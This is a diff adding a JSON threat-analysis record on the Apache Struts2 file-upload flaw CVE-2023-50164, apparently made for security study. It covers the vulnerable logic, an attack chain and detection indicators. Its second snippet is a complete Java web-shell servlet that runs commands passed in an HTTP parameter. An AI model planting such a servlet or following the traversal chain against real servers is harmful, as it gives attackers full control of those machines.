@@ -1,0 +1,130 @@
+{
+  "package_info": {
+    "package_name": "Apache Struts2",
+    "package_manager": "Maven",
+    "package_versions": "All versions prior to the patched release for CVE-2023-50164",
+    "why_malicious": "The affected versions of Apache Struts2 contain a critical directory traversal vulnerability (CVE-2023-50164) in the file upload mechanism. This flaw allows attackers to upload files to arbitrary locations on the server's filesystem, bypassing intended directory restrictions. Exploitation can result in remote code execution (RCE) by deploying malicious files (such as web shells) into web-accessible directories. The vulnerability is actively exploited and requires minimal attacker interaction, making all unpatched versions a severe security risk."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (during file upload request processing)",
+        "file_location": "Struts2 file upload handler (Java class responsible for processing file uploads, e.g., org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest)",
+        "required_permissions": [
+          "filesystem (write access to web application directories)",
+          "network (if attacker-deployed files are used for C2 or exfiltration)"
+        ]
+      },
+      "code_snippet": "// Pseudocode representing the vulnerable logic\nString uploadPath = request.getParameter(\"uploadPath\");\nFile uploadedFile = new File(uploadPath, uploadedFileName);\nuploadedFile.write(uploadedContent);",
+      "code_language": "java",
+      "code_behavior": "Processes file uploads by directly using a user-supplied file path parameter to determine the destination directory. Fails to sanitize or validate the path, enabling directory traversal and arbitrary file write outside the intended upload directory.",
+      "malice_analysis": {
+        "why_suspicious": "Accepting user-supplied file paths without sanitization allows attackers to use directory traversal sequences (e.g., '../') to write files outside the intended directory, potentially overwriting critical files or deploying malicious payloads.",
+        "violated_expectations": "Secure file upload handlers should restrict uploads to a predefined, safe directory and rigorously sanitize all user input to prevent directory traversal. The actual behavior allows arbitrary file placement based on unsanitized user input.",
+        "similar_legitimate_use": "Legitimate upload handlers may accept file names, but should never accept or trust user-supplied directory paths. All paths should be validated and resolved against a fixed base directory.",
+        "key_indicators": [
+          "Direct use of user-controlled file path in file system operations",
+          "Absence of path sanitization or validation",
+          "Ability to include directory traversal sequences in upload parameters",
+          "File writes occurring outside the intended upload directory"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after successful file upload and deployment of malicious file)",
+        "file_location": "Uploaded malicious WAR file (web shell) deployed to the web application directory (e.g., $CATALINA_BASE/webapps/)",
+        "required_permissions": [
+          "filesystem (write access to web application directory)",
+          "network (to receive attacker commands or exfiltrate data)",
+          "process execution (to run system commands via web shell)"
+        ]
+      },
+      "code_snippet": "// Example web shell (Java)\n@WebServlet(\"/shell\")\npublic class ShellServlet extends HttpServlet {\n  protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String cmd = req.getParameter(\"cmd\");\n    Process p = Runtime.getRuntime().exec(cmd);\n    InputStream in = p.getInputStream();\n    IOUtils.copy(in, resp.getOutputStream());\n  }\n}",
+      "code_language": "java",
+      "code_behavior": "Implements a web shell as a servlet, allowing attackers to execute arbitrary system commands on the server via HTTP requests and return the output in the HTTP response.",
+      "malice_analysis": {
+        "why_suspicious": "A web shell provides attackers with remote command execution capabilities, enabling full control over the compromised server. This is a common post-exploitation payload following directory traversal or arbitrary file upload vulnerabilities.",
+        "violated_expectations": "Production web applications should never expose endpoints that allow arbitrary command execution or direct access to system resources via HTTP requests.",
+        "similar_legitimate_use": "Such code may be used in penetration testing environments with explicit authorization, but has no legitimate use in production or public-facing applications.",
+        "key_indicators": [
+          "Servlet or endpoint that executes user-supplied commands via Runtime.exec()",
+          "Exposure of command output directly in HTTP responses",
+          "Servlet mapped to a generic or non-descriptive endpoint (e.g., /shell)",
+          "Absence of authentication or access controls on command execution endpoint"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (file upload request with case-manipulated parameters)",
+        "file_location": "Struts2 file upload handler (parameter parsing logic, e.g., HTTP request parameter map)",
+        "required_permissions": [
+          "filesystem (to write files if parameter override is successful)"
+        ]
+      },
+      "code_snippet": "// Pseudocode for case sensitivity exploit\nString param1 = request.getParameter(\"uploadPath\");\nString param2 = request.getParameter(\"UploadPath\");\n// The second parameter (different case) overrides the first due to case-insensitive handling in some contexts.",
+      "code_language": "java",
+      "code_behavior": "Exploits inconsistent case sensitivity in parameter parsing, allowing attackers to override or bypass security checks by submitting the same parameter with different letter casing. This can be used to bypass input validation and facilitate directory traversal.",
+      "malice_analysis": {
+        "why_suspicious": "Allowing the same parameter to be set multiple times with different casing can enable attackers to bypass security logic or input validation, especially if checks are case-sensitive but the underlying logic is not.",
+        "violated_expectations": "Parameter names should be handled consistently and securely, with clear enforcement of case sensitivity or normalization to prevent bypasses. Security checks should not be circumventable by simple case manipulation.",
+        "similar_legitimate_use": "There is no legitimate use for exploiting case sensitivity in parameter names; this is a logic flaw that should be prevented by robust input handling.",
+        "key_indicators": [
+          "Multiple parameters with similar names differing only by case in the same request",
+          "Parameter overriding or inconsistent behavior due to case-insensitive handling",
+          "Security checks or validation logic that can be bypassed by case manipulation"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts a file upload request containing directory traversal sequences (e.g., '../') and manipulates parameter casing to bypass input validation and security checks.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Malicious file (such as a web shell WAR) is written to an arbitrary location within the web application directory, bypassing intended upload restrictions."
+    },
+    {
+      "step": 2,
+      "action": "The malicious WAR file (web shell) is deployed and becomes accessible via the web server, allowing the attacker to interact with it remotely.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains a persistent remote command execution capability on the server through the web shell endpoint."
+    },
+    {
+      "step": 3,
+      "action": "Attacker sends HTTP requests to the web shell endpoint, supplying system commands to be executed on the server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Full server compromise, enabling the attacker to execute arbitrary commands, escalate privileges, and potentially move laterally within the network."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "File upload requests containing directory traversal patterns (e.g., '../' or '..\\') in file path parameters",
+      "HTTP requests with multiple upload parameters differing only by case (e.g., 'uploadPath' and 'UploadPath')",
+      "Deployment of new WAR files or servlets to web application directories at runtime",
+      "Emergence of new HTTP endpoints that allow command execution or expose system command output"
+    ],
+    "file_indicators": [
+      "Unexpected WAR files appearing in web application deployment directories (e.g., $CATALINA_BASE/webapps/)",
+      "Files written outside the intended upload directory, especially with attacker-supplied names",
+      "Servlets or classes with generic or suspicious names (e.g., ShellServlet, cmd.jsp, shell.war)"
+    ],
+    "network_indicators": [
+      "Inbound HTTP requests to file upload endpoints containing directory traversal sequences or multiple case-variant parameters",
+      "Inbound HTTP requests to newly deployed endpoints (e.g., /shell) with command parameters",
+      "Outbound network connections initiated by the web server process, potentially indicating C2 or data exfiltration"
+    ],
+    "how_to_detect": "Monitor file upload requests for directory traversal patterns and case-manipulated parameters. Audit web application directories for unexpected WAR files or new servlets. Detect the creation or access of new HTTP endpoints that allow command execution. Correlate web server logs for suspicious file writes followed by access to new endpoints. Deploy WAF rules to block directory traversal and double-parameter exploits. Monitor for outbound connections from the web server process that may indicate C2 activity."
+  }
+}
